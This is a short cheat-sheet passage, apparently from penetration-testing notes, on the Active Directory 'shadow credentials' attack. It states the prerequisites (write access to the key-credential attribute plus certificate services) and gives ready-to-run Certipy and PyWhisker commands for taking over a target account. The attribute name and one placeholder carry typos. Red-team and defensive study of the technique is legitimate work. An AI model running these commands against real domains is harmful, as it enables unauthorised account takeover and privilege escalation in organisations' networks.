the ability to change `nmsDS-KeyCredentialLink` with `Generic Write` permission and having ADCS is a prerequisite for the following shadow credential operations.
**Shadow Credentials (need ADCS)**

- **Requirement**: Can change `nmsDS-KeyCredentialLink` with `Generic Write` permission and ADCS.

- **Whisker.exe**

- **Certipy**

  ```bash
  certipy shadow auto -u <user>@<domain> -p <password> -account '<target_account>'
  ```

- **PyWhisker.py**

  ```bash
  pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMnE" --action "list"
  ```

---
